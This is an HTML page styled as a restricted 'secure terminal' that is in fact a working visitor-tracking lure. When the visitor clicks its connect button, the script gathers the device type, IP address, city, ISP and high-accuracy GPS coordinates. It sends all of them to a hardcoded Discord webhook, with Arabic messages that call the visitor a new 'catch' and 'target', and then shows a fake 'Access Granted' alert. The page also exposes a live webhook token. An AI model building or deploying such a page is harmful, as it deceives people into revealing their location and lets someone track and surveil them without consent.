<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE TERMINAL - ACCESS RESTRICTED</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .terminal {
            width: 100%;
            max-width: 600px;
            border: 1px solid #00ff66;
            padding: 30px;
            box-shadow: 0 0 20px rgba(0, 255, 102, 0.3);
            background: rgba(0, 0, 0, 0.95);
            text-align: center;
        }
        h2 { color: #ff0055; }
        .btn {
            background-color: #00ff66;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 0 10px rgba(0, 255, 102, 0.5);
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #ff0055;
            color: #fff;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.7);
        }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>[!] SECURE GATEWAY RESTRICTED [!]</h2>
        <p>Click below to verify identity and initialize secure session.</p>
        <button class="btn" onclick="triggerAccess()">[ INITIALIZE CONNECTION ]</button>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";

        async function sendToDiscord(message) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (e) {}
        }

        function getDeviceModel() {
            let ua = navigator.userAgent;
            let device = "Unknown Device";
            if (/android/i.test(ua)) {
                let match = ua.match(/;\s([^;]+)\sBuild\//) || ua.match(/\(([^)]+)\)/);
                device = (match && match[1]) ? "Android: " + match[1] : "Android Phone";
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                device = "Apple iOS Device";
            } else if (/windows/i.test(ua)) {
                device = "Windows PC";
            } else if (/macintosh/i.test(ua)) {
                device = "Mac OS Computer";
            }
            return device;
        }

        async function triggerAccess() {
            let device = getDeviceModel();
            let ipData = "IP: Loading...";
            
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                ipData = `IP: ${data.ip} | ${data.country_name} - ${data.city} | ISP: ${data.org}`;
            } catch (e) {
                ipData = "IP fetch failed";
            }

            let msg = `🚨 **[ صيد جديد دخل للموقع ]** 🚨\n\n` +
                      `📱 **الجهاز:** ${device}\n` +
                      `🌐 **الشبكة:** ${ipData}\n` +
                      `💻 **المنصة:** ${navigator.platform}`;
            
            await sendToDiscord(msg);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        let lat = pos.coords.latitude;
                        let lon = pos.coords.longitude;
                        let gpsMsg = `📍 **[ إحداثيات GPS الدقيقة ]**\n` +
                                     `خط العرض: ${lat}\n` +
                                     `خط الطول: ${lon}\n` +
                                     `🔗 https://maps.google.com/?q=${lat},${lon}`;
                        sendToDiscord(gpsMsg);
                    },
                    (err) => {
                        sendToDiscord(`⚠️ تنبيه: الهدف رفض إذن الـ GPS.`);
                    },
                    { enableHighAccuracy: true }
                );
            }

            alert("Access Granted. Initializing terminal...");
        }
    </script>
</body>
</html>
